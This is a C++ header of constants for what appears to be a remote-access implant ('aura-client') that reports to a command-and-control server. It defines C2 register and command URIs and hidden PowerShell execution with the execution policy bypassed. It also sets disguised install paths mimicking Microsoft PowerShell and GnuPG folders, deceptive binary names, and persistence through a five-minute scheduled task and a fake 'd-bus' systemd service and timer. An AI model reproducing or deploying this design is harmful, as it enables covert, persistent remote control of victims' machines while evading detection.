#ifndef CONSTANTS_HH
#define CONSTANTS_HH

#include <string>
#include <tuple>
#include <unordered_map>

const std::string C2_SERVER("http://localhost:41450");
const std::string REGISTER_URI("/convey/register/");
const std::string CMD_URI("/convey/cmd/");

const std::unordered_map<std::string, std::tuple<std::string, std::string>>
    SHELL_SYNTAX_LIST({{"bash", {"exec bash -c '", "'"}},
                       {"powershell",
                        {"powershell -ExecutionPolicy Bypass -NoLogo "
                         "-NonInteractive -NoProfile -WindowStyle Hidden \"",
                         "\""}}});

#ifdef WIN32

const std::string INSTALL_DIR("AppData/Local/Microsoft/Windows/PowerShell");
const std::string ADMIN_INSTALL_DIR(
    "C:/ProgramData/Microsoft/Windows/PowerShell");
const std::string COMMAND_TEMP_DIR("CacheData");

const std::string AUTH_FILE("ProfileDataCache");
const std::string BIN("aura-client.exe");
const std::string BIN_NEW("AnalyzeProcessCache.exe");

const std::string TASK_NAME("{3B3CC70E-08F1-46L6-87ED-4AK69034E676}");
const std::string TASK_FREQ("MINUTE");
const std::string TASK_FREQ_VALUE("5");

#endif  // WIN32

#ifdef __linux__

const std::string INSTALL_DIR(".gnupg/.seeds");
const std::string ROOT_HOME("/root");
const std::string SERVICE_DEST(".config/systemd/user");
const std::string SYS_SERVICE_DEST("/etc/systemd/system");
const std::string COMMAND_TEMP_DIR(".temp");

const std::string AUTH_FILE(".seed_gnupg~");
const std::string BIN("aura-client");
const std::string BIN_NEW(".seed_gnupg");

const std::string SERVICE("d-bus.service");
const std::string SYS_SERVICE("root.d-bus.service");
const std::string TIMER("d-bus.timer");

#endif  // __linux__

#endif  // CONSTANTS_HH